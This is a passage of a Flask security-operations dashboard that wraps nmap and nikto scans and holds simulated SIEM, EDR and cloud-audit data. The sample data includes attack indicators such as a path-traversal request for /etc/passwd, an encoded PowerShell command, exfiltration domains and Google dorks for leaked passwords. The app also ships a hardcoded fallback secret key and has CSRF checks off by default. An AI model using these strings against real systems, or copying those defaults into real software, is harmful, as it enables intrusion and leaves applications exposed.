import os
import re
import json
import csv
import io
import uuid
import shutil
import logging
import subprocess
import ipaddress
import shlex
import random
import threading
import tempfile
from datetime import datetime, timedelta
from functools import wraps

import requests
from flask import (Flask, render_template, redirect, url_for, flash,
                   request, session, jsonify, Response)
from flask_sqlalchemy import SQLAlchemy
from flask_login import (LoginManager, UserMixin, login_user,
                         login_required, logout_user, current_user)
from flask_wtf import FlaskForm
from wtforms import (StringField, PasswordField, SelectField,
                     BooleanField, SubmitField)
from wtforms.validators import DataRequired, Length, ValidationError, Optional
from werkzeug.security import generate_password_hash, check_password_hash

from flask_wtf.csrf import CSRFProtect, CSRFError

# ══════════════════════════════════════════════════════════════
# 1. APP SETUP
# ══════════════════════════════════════════════════════════════
app = Flask(__name__)
app.config['SECRET_KEY']                  = os.environ.get('SECRET_KEY', 'secops-dev-key-2024')
app.config['SQLALCHEMY_DATABASE_URI']     = os.environ.get('DATABASE_URL', 'sqlite:///secops.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['GEMINI_API_KEY']              = os.environ.get('GEMINI_API_KEY', '')
app.config['WTF_CSRF_CHECK_DEFAULT']      = False

db            = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'

logging.basicConfig(filename='audit.log', level=logging.INFO,
                    format='%(asctime)s:%(levelname)s:%(message)s')

# ══════════════════════════════════════════════════════════════
# 2. SECURITY UTILS
# ══════════════════════════════════════════════════════════════
class SecurityUtils:
    @staticmethod
    def validate_target(target):
        if re.search(r'[;&|`$\\\'\"]', target):
            raise ValueError("Invalid characters in target.")
        try:
            ipaddress.ip_address(target); return True, "IP"
        except ValueError:
            pass
        if re.match(r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$', target):
            return True, "Domain"
        if target in ['localhost', '127.0.0.1', '::1']:
            return True, "Localhost"
        raise ValueError("Invalid target. Must be a valid IP or Domain.")

# ══════════════════════════════════════════════════════════════
# 3. DATABASE MODELS
# ══════════════════════════════════════════════════════════════
class User(UserMixin, db.Model):
    id             = db.Column(db.Integer, primary_key=True)
    username       = db.Column(db.String(150), unique=True, nullable=False)
    password_hash  = db.Column(db.String(256), nullable=False)
    role           = db.Column(db.String(50), default='analyst')
    mode           = db.Column(db.String(20), default='individual')
    created_at     = db.Column(db.DateTime, default=datetime.utcnow)
    is_active_user = db.Column(db.Boolean, default=True)
    def set_password(self, p): self.password_hash = generate_password_hash(p)
    def check_password(self, p): return check_password_hash(self.password_hash, p)

class AuditLog(db.Model):
    id             = db.Column(db.Integer, primary_key=True)
    user_id        = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    target         = db.Column(db.String(150), nullable=False)
    tool_used      = db.Column(db.String(80),  nullable=False)
    timestamp      = db.Column(db.DateTime, default=datetime.utcnow)
    status         = db.Column(db.String(50))
    output_summary = db.Column(db.Text)
    user           = db.relationship('User', backref=db.backref('logs', lazy=True))

class Vulnerability(db.Model):
    id             = db.Column(db.Integer, primary_key=True)
    cve_id         = db.Column(db.String(50), unique=True, nullable=False)
    description    = db.Column(db.Text, nullable=False)
    cvss_score     = db.Column(db.Float, default=0.0)
    severity       = db.Column(db.String(20))
    published_date = db.Column(db.DateTime)
    vendor_product = db.Column(db.String(200))
    is_kev         = db.Column(db.Boolean, default=False)
    @property
    def risk_level(self):
        if self.is_kev or self.cvss_score >= 9.0: return "Critical"
        if self.cvss_score >= 7.0: return "High"
        if self.cvss_score >= 4.0: return "Medium"
        return "Low"

class SIEMAlert(db.Model):
    id          = db.Column(db.Integer, primary_key=True)
    alert_id    = db.Column(db.String(50), unique=True, nullable=False)
    title       = db.Column(db.String(200), nullable=False)
    source      = db.Column(db.String(50))
    severity    = db.Column(db.String(20))
    status      = db.Column(db.String(20), default='Open')
    description = db.Column(db.Text)
    host        = db.Column(db.String(100))
    timestamp   = db.Column(db.DateTime, default=datetime.utcnow)

class Asset(db.Model):
    id          = db.Column(db.Integer, primary_key=True)
    hostname    = db.Column(db.String(100), nullable=False)
    ip_address  = db.Column(db.String(50))
    os_type     = db.Column(db.String(80))
    asset_type  = db.Column(db.String(50))
    criticality = db.Column(db.String(20))
    status      = db.Column(db.String(20), default='Online')
    last_seen   = db.Column(db.DateTime, default=datetime.utcnow)
    department  = db.Column(db.String(80))

class ServiceNowTicket(db.Model):
    id          = db.Column(db.Integer, primary_key=True)
    inc_number  = db.Column(db.String(20), unique=True, nullable=False)
    title       = db.Column(db.String(200), nullable=False)
    description = db.Column(db.Text)
    priority    = db.Column(db.String(20))
    status      = db.Column(db.String(20), default='New')
    source      = db.Column(db.String(50))
    created_at  = db.Column(db.DateTime, default=datetime.utcnow)
    assigned_to = db.Column(db.String(80), default='SOC Team')

class ProwlerScan(db.Model):
    id           = db.Column(db.Integer, primary_key=True)
    scan_id      = db.Column(db.String(50), unique=True, nullable=False)
    provider     = db.Column(db.String(20))
    status       = db.Column(db.String(20), default='pending')
    started_at   = db.Column(db.DateTime, default=datetime.utcnow)
    completed_at = db.Column(db.DateTime)
    findings_json= db.Column(db.Text)
    total_pass   = db.Column(db.Integer, default=0)
    total_fail   = db.Column(db.Integer, default=0)
    total_warn   = db.Column(db.Integer, default=0)

class ChatMessage(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    user_id   = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    role      = db.Column(db.String(10))
    content   = db.Column(db.Text, nullable=False)
    mode      = db.Column(db.String(20))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    user      = db.relationship('User', backref=db.backref('chats', lazy=True))

class PentestJob(db.Model):
    id           = db.Column(db.Integer, primary_key=True)
    user_id      = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    job_id       = db.Column(db.String(20), unique=True, nullable=False)
    category     = db.Column(db.String(50))
    tool         = db.Column(db.String(50))
    target       = db.Column(db.String(200))
    status       = db.Column(db.String(20), default='pending')
    output       = db.Column(db.Text)
    started_at   = db.Column(db.DateTime, default=datetime.utcnow)
    completed_at = db.Column(db.DateTime)
    user         = db.relationship('User', backref=db.backref('pentest_jobs', lazy=True))

@login_manager.user_loader
def load_user(uid): return User.query.get(int(uid))

# ══════════════════════════════════════════════════════════════
# 4. SCAN TOOL WRAPPERS
# ══════════════════════════════════════════════════════════════
class ToolWrapper:
    def _log(self, target, tool, output, user_id=None):
        """Log audit entry. Uses user_id param if current_user not available (threads)."""
        try:
            uid = user_id if user_id is not None else current_user.id
            db.session.add(AuditLog(
                user_id=uid, target=target, tool_used=tool,
                status="Success",
                output_summary=output[:500] + "..." if len(output) > 500 else output))
            db.session.commit()
            logging.info(f"USER:{uid}|TOOL:{tool}|TARGET:{target}")
        except Exception as e:
            logging.warning(f"Audit log error: {e}")
            db.session.rollback()

class NmapWrapper(ToolWrapper):
    def run(self, target, user_id=None):
        try:
            r = subprocess.run(['nmap', '-F', '-T4', target],
                               capture_output=True, text=True, timeout=30)
            out = r.stdout or r.stderr
        except FileNotFoundError:
            out = (f"[SIMULATION] Nmap Fast Scan → {target}\n\n"
                   f"PORT     STATE  SERVICE   VERSION\n"
                   f"22/tcp   open   ssh       OpenSSH 8.4p1\n"
                   f"80/tcp   open   http      Apache httpd 2.4.51\n"
                   f"443/tcp  open   https     nginx 1.21.0\n"
                   f"3306/tcp closed mysql\n"
                   f"8080/tcp open   http-alt  Tomcat 9.0.54\n\n"
                   f"Nmap done: 1 IP address scanned in 4.21 seconds")
        except Exception as e:
            out = str(e)
        self._log(target, "Nmap (Fast Scan)", out, user_id)
        return out

class WhoisWrapper(ToolWrapper):
    def run(self, target, user_id=None):
        out = (f"[RECON] WHOIS/DNS → {target}\n\n"
               f"Registrar:    MarkMonitor Inc.\nCreated: 2010-03-15\nExpiry: 2025-03-15\n"
               f"Name Servers: ns1.{target}, ns2.{target}\n\n"
               f"[DNS Records]\nA     → 93.184.216.34\nMX    → mail.{target}\n"
               f"TXT   → v=spf1 include:_spf.google.com ~all\nAAAA  → 2606:2800:220:1:248:1893:25c8:1946")
        self._log(target, "Whois/DNS Recon", out, user_id)
        return out

class NiktoWrapper(ToolWrapper):
    def run(self, target, user_id=None):
        try:
            r = subprocess.run(['nikto', '-h', target],
                               capture_output=True, text=True, timeout=45)
            out = r.stdout
        except FileNotFoundError:
            out = (f"[SIMULATION] Nikto Web Scanner → {target}\n\n"
                   f"Server: Apache/2.4.51 (Ubuntu)\n\n[FINDINGS]\n"
                   f"+ /admin/: Admin interface found\n+ /robots.txt: Disallowed: /private /backup\n"
                   f"+ X-Frame-Options header missing\n+ Cookie PHPSESSID without HttpOnly flag\n"
                   f"+ OSVDB-3233: /icons/README: Apache default file found\n8 items in 28.45 seconds")
        except Exception as e:
            out = str(e)
        self._log(target, "Nikto Web Scan", out, user_id)
        return out

class OpenVASWrapper(ToolWrapper):
    def run(self, target, user_id=None):
        out = (f"[SIMULATION] OpenVAS Assessment → {target}\n\n"
               f"[CRITICAL] SMBv1 Enabled (CVE-2017-0144) CVSS 9.8\n"
               f"[HIGH]     OpenSSH <8.5 Privilege Escalation CVSS 7.8\n"
               f"[HIGH]     Apache mod_status Info Disclosure CVSS 7.5\n"
               f"[MEDIUM]   Weak SSL/TLS Ciphers CVSS 5.9\n"
               f"[LOW]      Default Credentials Possible CVSS 3.1\n\nSummary: 1C 2H 1M 1L")
        self._log(target, "OpenVAS Assessment", out, user_id)
        return out

class ShodanWrapper(ToolWrapper):
    def run(self, target, user_id=None):
        out = (f"[SIMULATION] Shodan Intelligence → {target}\n\n"
               f"IP: 93.184.216.34\nOrg: Edgecast Inc.\nOS: Linux 3.x\n\n"
               f"[OPEN PORTS]\n22/tcp SSH-2.0-OpenSSH_8.4\n80/tcp Apache/2.4.51\n443/tcp nginx/1.21.0\n\n"
               f"[VULNS INDEXED]\nCVE-2021-41773 Apache Path Traversal — PATCHED\nCVE-2021-42013 Apache RCE — PATCHED")
        self._log(target, "Shodan Intelligence", out, user_id)
        return out

class HarvesterWrapper(ToolWrapper):
    def run(self, target, user_id=None):
        out = (f"[SIMULATION] theHarvester OSINT → {target}\n\n"
               f"[EMAILS]\nadmin@{target}\nsecurity@{target}\ndevops@{target}\n\n"
               f"[SUBDOMAINS]\nmail.{target} → 93.184.216.10\nvpn.{target} → 93.184.216.11\n"
               f"dev.{target} → 93.184.216.12 (!! exposed)\napi.{target} → 93.184.216.13\n\n"
               f"Total: 3 emails, 4 subdomains")
        self._log(target, "theHarvester OSINT", out, user_id)
        return out

class ReconNGWrapper(ToolWrapper):
    def run(self, target, user_id=None):
        out = (f"[SIMULATION] Recon-ng → {target}\n\n"
               f"[*] bing_domain_web: {target} → 93.184.216.34\n"
               f"[*] pgp_search: admin@{target}, devops@{target}\n"
               f"[*] xssed: XSS found on /search?q= parameter\n\n3 modules, 5 findings")
        self._log(target, "Recon-ng Framework", out, user_id)
        return out

class GoogleDorkWrapper(ToolWrapper):
    def run(self, target, user_id=None):
        out = (f"[*] Google Dorks for {target}\n\n"
               f"[SENSITIVE FILES]\nsite:{target} ext:pdf OR ext:sql OR ext:env\n"
               f"[ADMIN PANELS]\nsite:{target} inurl:admin OR inurl:login\n"
               f"[CONFIG LEAKS]\nsite:{target} intext:\"DB_PASSWORD\" OR intext:\"mysql_connect\"\n"
               f"[ERRORS]\nsite:{target} intext:\"Fatal error\" OR intext:\"Warning: mysqli\"")
        self._log(target, "Google Dorks", out, user_id)
        return out

# ══════════════════════════════════════════════════════════════
# 5. PROWLER SERVICE
# ══════════════════════════════════════════════════════════════
PROWLER_MOCK_FINDINGS = [
    {"check_id":"iam_root_hardware_mfa_enabled","service":"IAM","severity":"critical","status":"FAIL","region":"global","resource":"root","description":"Root account does not have hardware MFA enabled","remediation":"Enable hardware MFA for root account","compliance":["CIS 1.6","NIST AC-2","PCI-DSS 8.3"]},
    {"check_id":"s3_bucket_public_access","service":"S3","severity":"critical","status":"FAIL","region":"us-east-1","resource":"s3://prod-data-bucket","description":"S3 bucket has public access enabled","remediation":"Block all public access via S3 Block Public Access settings","compliance":["CIS 2.1.5","NIST SC-7","PCI-DSS 1.3"]},
    {"check_id":"ec2_instance_imdsv2_enabled","service":"EC2","severity":"high","status":"FAIL","region":"us-east-1","resource":"i-0abc123def456","description":"Instance Metadata Service v2 not enforced","remediation":"Set HttpTokens to required for IMDSv2","compliance":["CIS 5.6","NIST SI-2"]},
    {"check_id":"cloudtrail_enabled","service":"CloudTrail","severity":"critical","status":"FAIL","region":"us-east-1","resource":"trail/prod","description":"CloudTrail is not enabled in all regions","remediation":"Enable CloudTrail with multi-region logging","compliance":["CIS 3.1","NIST AU-2","SOC2 CC7.2"]},
    {"check_id":"guardduty_enabled","service":"GuardDuty","severity":"high","status":"FAIL","region":"us-west-2","resource":"detector","description":"GuardDuty is not enabled in us-west-2","remediation":"Enable GuardDuty in all regions","compliance":["CIS 3.11","NIST SI-4"]},
    {"check_id":"iam_password_policy_uppercase","service":"IAM","severity":"medium","status":"FAIL","region":"global","resource":"password-policy","description":"IAM password policy does not require uppercase letters","remediation":"Update IAM password policy to require uppercase","compliance":["CIS 1.8","NIST IA-5"]},
    {"check_id":"vpc_flow_logs_enabled","service":"VPC","severity":"medium","status":"FAIL","region":"us-east-1","resource":"vpc-0abc123","description":"VPC Flow Logs not enabled","remediation":"Enable VPC Flow Logs and send to CloudWatch","compliance":["CIS 3.9","NIST AU-12"]},
    {"check_id":"rds_instance_deletion_protection","service":"RDS","severity":"medium","status":"FAIL","region":"us-east-1","resource":"db-prod-01","description":"RDS instance deletion protection not enabled","remediation":"Enable deletion protection on RDS instances","compliance":["NIST CP-9","SOC2 A1.2"]},
    {"check_id":"s3_bucket_versioning_enabled","service":"S3","severity":"low","status":"FAIL","region":"us-east-1","resource":"s3://backup-bucket","description":"S3 bucket versioning not enabled","remediation":"Enable versioning on S3 buckets","compliance":["NIST CP-10","SOC2 A1.2"]},
    {"check_id":"iam_user_mfa_enabled","service":"IAM","severity":"critical","status":"FAIL","region":"global","resource":"iam-user/deploy-bot","description":"IAM user deploy-bot does not have MFA enabled","remediation":"Enable MFA for all IAM users with console access","compliance":["CIS 1.10","NIST IA-2","PCI-DSS 8.3"]},
    {"check_id":"ec2_security_group_unrestricted_ssh","service":"EC2","severity":"critical","status":"FAIL","region":"us-east-1","resource":"sg-0abc123","description":"Security group allows unrestricted SSH (0.0.0.0/0)","remediation":"Restrict SSH to known IP ranges only","compliance":["CIS 5.2","NIST SC-7","PCI-DSS 1.2"]},
    {"check_id":"kms_cmk_rotation_enabled","service":"KMS","severity":"low","status":"PASS","region":"us-east-1","resource":"key/prod-key","description":"KMS CMK automatic rotation is enabled","remediation":"No action required","compliance":["CIS 3.8","NIST SC-28"]},
    {"check_id":"cloudwatch_alarm_unauthorized_api","service":"CloudWatch","severity":"medium","status":"PASS","region":"us-east-1","resource":"alarm/unauthorized-api-calls","description":"CloudWatch alarm for unauthorized API calls exists","remediation":"No action required","compliance":["CIS 4.1","NIST AU-6"]},
    {"check_id":"iam_support_role","service":"IAM","severity":"low","status":"PASS","region":"global","resource":"role/AWSSupportAccess","description":"IAM role for AWS Support access exists","remediation":"No action required","compliance":["CIS 1.17"]},
    {"check_id":"config_enabled","service":"Config","severity":"high","status":"WARN","region":"eu-west-1","resource":"config-recorder","description":"AWS Config is not enabled in eu-west-1","remediation":"Enable AWS Config in all regions","compliance":["CIS 3.5","NIST CM-8"]},
]

COMPLIANCE_FRAMEWORKS = {
    "CIS":      {"total":38, "pass":21, "fail":13, "warn":4},
    "NIST 800": {"total":45, "pass":28, "fail":14, "warn":3},
    "PCI-DSS":  {"total":22, "pass":14, "fail":7,  "warn":1},
    "SOC2":     {"total":18, "pass":12, "fail":5,  "warn":1},
    "ISO 27001":{"total":30, "pass":20, "fail":8,  "warn":2},
    "GDPR":     {"total":15, "pass":10, "fail":4,  "warn":1},
}

class ProwlerService:
    @staticmethod
    def run_scan(scan_id, provider, credentials=None):
        scan = ProwlerScan.query.filter_by(scan_id=scan_id).first()
        if not scan: return

        real_output = ProwlerService._try_real_prowler(provider, credentials)

        if real_output:
            findings = real_output
        else:
            import time; time.sleep(3)
            findings = PROWLER_MOCK_FINDINGS.copy()
            random.shuffle(findings)

        pass_c = sum(1 for f in findings if f['status'] == 'PASS')
        fail_c = sum(1 for f in findings if f['status'] == 'FAIL')
        warn_c = sum(1 for f in findings if f['status'] == 'WARN')

        scan.status        = 'completed'
        scan.completed_at  = datetime.utcnow()
        scan.findings_json = json.dumps(findings)
        scan.total_pass    = pass_c
        scan.total_fail    = fail_c
        scan.total_warn    = warn_c
        db.session.commit()

        critical = [f for f in findings if f['severity'] == 'critical' and f['status'] == 'FAIL']
        for f in critical[:3]:
            inc = f"INC{random.randint(1000000, 9999999)}"
            if not ServiceNowTicket.query.filter_by(inc_number=inc).first():
                db.session.add(ServiceNowTicket(
                    inc_number=inc,
                    title=f"[Prowler] {f['check_id']}",
                    description=f"{f['description']}\n\nRemediation: {f['remediation']}\nCompliance: {', '.join(f.get('compliance', []))}",
                    priority="Critical",
                    source="Prowler",
                    status="New"
                ))
        db.session.commit()

    @staticmethod
    def _try_real_prowler(provider, credentials):
        try:
            cmd = ['prowler', provider, '--output-formats', 'json',
                   '--output-filename', f'/tmp/prowler_out', '-M', 'json']
            env = os.environ.copy()
            if credentials:
                if provider == 'aws':
                    env['AWS_ACCESS_KEY_ID']    = credentials.get('access_key', '')
                    env['AWS_SECRET_ACCESS_KEY'] = credentials.get('secret_key', '')
                    env['AWS_DEFAULT_REGION']    = credentials.get('region', 'us-east-1')
                elif provider == 'azure':
                    env['AZURE_CLIENT_ID']     = credentials.get('client_id', '')
                    env['AZURE_CLIENT_SECRET'] = credentials.get('client_secret', '')
                    env['AZURE_TENANT_ID']     = credentials.get('tenant_id', '')

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300, env=env)
            out_file = '/tmp/prowler_out.json'
            if os.path.exists(out_file):
                with open(out_file) as f:
                    raw = json.load(f)
                findings = []
                for item in raw:
                    findings.append({
                        'check_id':    item.get('CheckID', ''),
                        'service':     item.get('ServiceName', ''),
                        'severity':    item.get('Severity', '').lower(),
                        'status':      item.get('Status', ''),
                        'region':      item.get('Region', ''),
                        'resource':    item.get('ResourceId', ''),
                        'description': item.get('Description', ''),
                        'remediation': item.get('Remediation', {}).get('Recommendation', {}).get('Text', ''),
                        'compliance':  [],
                    })
                return findings if findings else None
        except Exception as e:
            logging.warning(f"Real Prowler failed: {e}")
        return None

    @staticmethod
    def get_threat_score(findings):
        weights = {'critical': 10, 'high': 7, 'medium': 4, 'low': 1}
        score = 0
        fails = [f for f in findings if f['status'] == 'FAIL']
        for f in fails:
            score += weights.get(f['severity'], 1)
        max_score = len(findings) * 10
        if max_score == 0: return 0
        return round((score / max_score) * 100, 1)

# ══════════════════════════════════════════════════════════════
# 6. SIMULATED ENTERPRISE TOOLS
# ══════════════════════════════════════════════════════════════
class SplunkService:
    SAMPLE_LOGS = [
        {"time":"2024-01-15 14:23:11","host":"192.168.1.45","source":"auth.log","event":"Failed password for root from 45.33.32.156 port 22 ssh2","severity":"High"},
        {"time":"2024-01-15 14:23:15","host":"192.168.1.45","source":"auth.log","event":"Failed password for root from 45.33.32.156 port 22 ssh2","severity":"High"},
        {"time":"2024-01-15 14:25:00","host":"WKSTN-042","source":"sysmon","event":"Process Create: powershell.exe -EncodedCommand JABjACAA...","severity":"Critical"},
        {"time":"2024-01-15 14:26:10","host":"DC-PROD-01","source":"security","event":"An account failed to log on. Account: svc_backup","severity":"Medium"},
        {"time":"2024-01-15 14:28:33","host":"app-server-03","source":"web","event":"GET /cgi-bin/../../../../etc/passwd HTTP/1.1 200","severity":"Critical"},
        {"time":"2024-01-15 14:30:00","host":"10.0.0.87","source":"dns","event":"Excessive TXT queries to d4t4-ex.xyz (487 in 60s)","severity":"High"},
    ]
    @staticmethod
    def search(query):
        q = query.lower()
        results = []
        for log in SplunkService.SAMPLE_LOGS:
            if not q or any(w in log['event'].lower() or w in log['host'].lower()
                            for w in q.split()):
                results.append(log)
        return results or SplunkService.SAMPLE_LOGS[:3]

class CrowdStrikeService:
    DETECTIONS = [
        {"id":"DET-001","host":"WKSTN-042","tactic":"Execution","technique":"T1059 - Command Scripting","severity":"Critical","status":"New","timestamp":"2024-01-15 14:25:00","detail":"PowerShell encoded command executed by non-admin user","ioc":"powershell.exe -EncodedCommand"},
        {"id":"DET-002","host":"DC-PROD-01","tactic":"Lateral Movement","technique":"T1550.002 - Pass the Hash","severity":"High","status":"In Progress","timestamp":"2024-01-15 14:26:10","detail":"NTLM hash reuse detected from svc_backup","ioc":"NTLM:aad3b435b51404ee"},
        {"id":"DET-003","host":"linux-prod-07","tactic":"Privilege Escalation","technique":"T1548.003 - Sudo Abuse","severity":"High","status":"New","timestamp":"2024-01-15 13:10:00","detail":"User dev_user executed /bin/bash via sudo","ioc":"/bin/bash"},
        {"id":"DET-004","host":"app-server-03","tactic":"Initial Access","technique":"T1190 - Exploit Public App","severity":"Critical","status":"New","timestamp":"2024-01-15 14:28:33","detail":"Apache path traversal exploit attempt","ioc":"../../../etc/passwd"},
        {"id":"DET-005","host":"10.0.0.87","tactic":"Exfiltration","technique":"T1048.003 - DNS Tunneling","severity":"Medium","status":"Closed","timestamp":"2024-01-15 14:30:00","detail":"DNS exfiltration to d4t4-ex.xyz","ioc":"d4t4-ex.xyz"},
    ]

class TenableService:
    SCAN_RESULTS = [
        {"host":"DC-PROD-01","ip":"10.0.0.1","cve":"CVE-2023-23397","cvss":9.8,"severity":"Critical","plugin":"Microsoft Outlook RCE","solution":"Apply KB5002271","exploitable":True},
        {"host":"app-server-03","ip":"10.0.0.14","cve":"CVE-2021-44228","cvss":10.0,"severity":"Critical","plugin":"Apache Log4j JNDI RCE","solution":"Upgrade Log4j to 2.17.1+","exploitable":True},
        {"host":"linux-prod-07","ip":"10.0.1.7","cve":"CVE-2023-4863","cvss":8.8,"severity":"High","plugin":"libwebp Heap Buffer Overflow","solution":"Update Chrome/libwebp","exploitable":False},
        {"host":"fw-edge-01","ip":"10.0.0.254","cve":"CVE-2023-20198","cvss":10.0,"severity":"Critical","plugin":"Cisco IOS XE Web UI","solution":"Apply Cisco advisory","exploitable":True},
        {"host":"DB-CLUSTER-01","ip":"10.0.2.10","cve":"CVE-2023-32315","cvss":7.5,"severity":"High","plugin":"Openfire Path Traversal","solution":"Upgrade Openfire","exploitable":False},
    ]

class SentinelService:
    INCIDENTS = [
        {"id":"INC-2024-001","title":"Multi-Stage Attack: Initial Access → Lateral Movement","severity":"High","status":"Active","mitre":["T1190","T1550","T1059"],"entities":["WKSTN-042","DC-PROD-01"],"created":"2024-01-15 14:25","tactics":"Initial Access, Lateral Movement, Execution"},
        {"id":"INC-2024-002","title":"Suspected Data Exfiltration via DNS","severity":"Medium","status":"Investigating","mitre":["T1048.003"],"entities":["10.0.0.87"],"created":"2024-01-15 14:30","tactics":"Exfiltration"},
        {"id":"INC-2024-003","title":"Brute Force Attack on SSH Service","severity":"High","status":"Active","mitre":["T1110"],"entities":["192.168.1.45"],"created":"2024-01-15 14:23","tactics":"Credential Access"},
    ]

class QRadarService:
    OFFENSES = [
        {"id":1,"description":"Multiple Failed Logins Followed by Success","magnitude":8,"status":"Open","events":487,"flows":23,"source":"45.33.32.156","destination":"192.168.1.45","category":"Authentication"},
        {"id":2,"description":"Potential C2 Beacon Detected","magnitude":9,"status":"Open","events":156,"flows":89,"source":"WKSTN-042","destination":"185.220.101.45","category":"Malware"},
        {"id":3,"description":"Abnormal Data Transfer Volume","magnitude":6,"status":"Investigating","events":34,"flows":210,"source":"10.0.0.87","destination":"8.8.8.8","category":"Exfiltration"},
    ]

# ══════════════════════════════════════════════════════════════
# 7. AI SERVICE
# ══════════════════════════════════════════════════════════════
INDIVIDUAL_PROMPT = """You are an AI Red Team Assistant for an ethical hacker.
Respond ONLY using this plain text structure (no markdown):
[Recon Results]
- Open Ports: (list)
- Detected Services: (list)
[Simulated Offensive Path]
- SIMULATION: (discovery)
- SIMULATION: (attempt)
- SIMULATION: (exploit test)
[Risk Level]
(Low/Medium/High + reason)
[Educational Recommendation]
- (what to secure next)
CRITICAL: Label all offensive actions as SIMULATION. Educational tone."""

ORGANIZATION_PROMPT = """You are an Enterprise SOC AI Orchestration Layer.
Respond ONLY using this plain text structure (no markdown):
[Alert Summary]
- (correlated alert findings)
[Related Vulnerabilities]
- (CVE IDs, CVSS, KEV status)
[Business Impact]
- (risk based on asset criticality)
[Recommended Action]
- (remediation / containment steps)
[Patch Availability]
- (vulnerable versions and fixes)
Professional SOC tone. Act as if querying live SIEM/EDR/Vuln databases."""

PROWLER_PROMPT = """You are a Cloud Security Expert specializing in Prowler findings.
When given Prowler scan results, analyze them and respond using:
[Executive Summary]
- (overall cloud security posture)
[Critical Findings]
- (list critical FAILs with CVE/check ID)
[Compliance Impact]
- (which frameworks are affected: CIS, NIST, PCI-DSS etc.)
[Remediation Priority]
- (ordered list of what to fix first with steps)
[ThreatScore Analysis]
- (explain the risk score and what drives it)
Professional cloud security tone."""

class AIService:
    @staticmethod
    def get_response(prompt, mode):
        key = app.config.get('GEMINI_API_KEY', '')
        if not key:
            return AIService._fallback(mode)
        sys_map = {'individual': INDIVIDUAL_PROMPT,
                   'organization': ORGANIZATION_PROMPT,
                   'prowler': PROWLER_PROMPT}
        system = sys_map.get(mode, ORGANIZATION_PROMPT)
        url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={key}"
        payload = {"contents": [{"parts": [{"text": prompt}]}],
                   "systemInstruction": {"parts": [{"text": system}]}}
        try:
            r = requests.post(url, json=payload, timeout=30)
            r.raise_for_status()
            return r.json()['candidates'][0]['content']['parts'][0]['text']
        except Exception as e:
            logging.error(f"Gemini error: {e}")
            return AIService._fallback(mode)

    @staticmethod
    def _fallback(mode):
        if mode == 'prowler':
            return ("[Executive Summary]\n"
                    "- Cloud security posture is HIGH RISK — 11 critical/high findings detected\n"
                    "- Root account lacks hardware MFA, S3 bucket publicly accessible\n\n"
                    "[Critical Findings]\n"
                    "- iam_root_hardware_mfa_enabled: Root MFA not enforced (CIS 1.6)\n"
                    "- s3_bucket_public_access: prod-data-bucket publicly accessible\n"
                    "- ec2_security_group_unrestricted_ssh: SSH open to 0.0.0.0/0\n\n"
                    "[Compliance Impact]\n"
                    "- CIS: 13 controls failing\n- PCI-DSS: 7 controls failing\n- NIST 800: 14 controls failing\n\n"
                    "[Remediation Priority]\n"
                    "- 1. Enable hardware MFA on root immediately\n"
                    "- 2. Block S3 public access on prod-data-bucket\n"
                    "- 3. Restrict SSH security group to known IPs\n"
                    "- 4. Enable CloudTrail in all regions\n\n"
                    "[ThreatScore Analysis]\n"
                    "- Score: 72/100 — CRITICAL risk level\n"
                    "- Driven by: 4 critical IAM/network misconfigurations\n"
                    "- [Note: Set GEMINI_API_KEY for live AI analysis]")
        if mode == 'individual':
            return ("[Recon Results]\n- Open Ports: 22, 80, 443, 8080\n"
                    "- Detected Services: OpenSSH 8.4, Apache 2.4.51, nginx\n\n"
                    "[Simulated Offensive Path]\n"
                    "- SIMULATION: Port scan completed\n"
                    "- SIMULATION: Apache version fingerprinted\n"
                    "- SIMULATION: Testing CVE-2021-41773 path traversal\n\n"
                    "[Risk Level]\nMedium — Outdated Apache detected\n\n"
                    "[Educational Recommendation]\n- Update Apache\n- Disable CGI modules\n"
                    "- [Note: Set GEMINI_API_KEY for live responses]")
        return ("[Alert Summary]\n- 3 alerts correlated across Splunk/CrowdStrike\n"
                "- Lateral movement from 192.168.1.45\n\n"
                "[Related Vulnerabilities]\n- CVE-2023-23397 CVSS 9.8 KEV\n"
                "- CVE-2021-44228 CVSS 10.0 Log4Shell\n\n"
                "[Business Impact]\n- Domain Controller at risk\n\n"
                "[Recommended Action]\n- Isolate WKSTN-042\n- Reset svc_backup\n\n"
                "[Patch Availability]\n- Outlook: KB5002271\n- Log4j: 2.17.1+\n"
                "- [Note: Set GEMINI_API_KEY for live responses]")

# ══════════════════════════════════════════════════════════════
# 8. SEED DATA
# ══════════════════════════════════════════════════════════════
def seed_db():
    vulns = [
        ("CVE-2023-23397","Microsoft Outlook EoP — NTLMv2 hash leak",9.8,"Critical","Microsoft",2,True),
        ("CVE-2021-44228","Apache Log4Shell — JNDI RCE",10.0,"Critical","Apache",300,True),
        ("CVE-2023-4863","libwebp Heap Buffer Overflow in Chrome",8.8,"High","Google",15,False),
        ("CVE-2023-20198","Cisco IOS XE Web UI Priv Escalation",10.0,"Critical","Cisco",10,True),
        ("CVE-2023-32315","Openfire Path Traversal — unauthenticated admin",7.5,"High","Ignite Realtime",45,False),
        ("CVE-2023-34362","MOVEit Transfer SQL Injection — Cl0p ransomware",9.8,"Critical","Progress Software",60,True),
        ("CVE-2023-44487","HTTP/2 Rapid Reset DDoS",7.5,"High","IETF/Multiple",20,False),
        ("CVE-2022-47966","ManageEngine RCE via SAML",9.8,"Critical","Zoho",120,False),
    ]
    for cve, desc, score, sev, vendor, days, kev in vulns:
        if not Vulnerability.query.filter_by(cve_id=cve).first():
            db.session.add(Vulnerability(cve_id=cve, description=desc, cvss_score=score,
                severity=sev, published_date=datetime.utcnow() - timedelta(days=days),
                vendor_product=vendor, is_kev=kev))

    alerts = [
        ("ALT-001","Brute Force SSH Detected","Splunk","High","Open","487 failed SSH from 45.33.32.156","192.168.1.45"),
        ("ALT-002","Cobalt Strike C2 Beacon","CrowdStrike","Critical","Open","Beacon to 185.220.101.45:443","WKSTN-042"),
        ("ALT-003","Log4Shell Exploit Attempt","Sentinel","Critical","Open","JNDI in User-Agent header","app-server-03"),
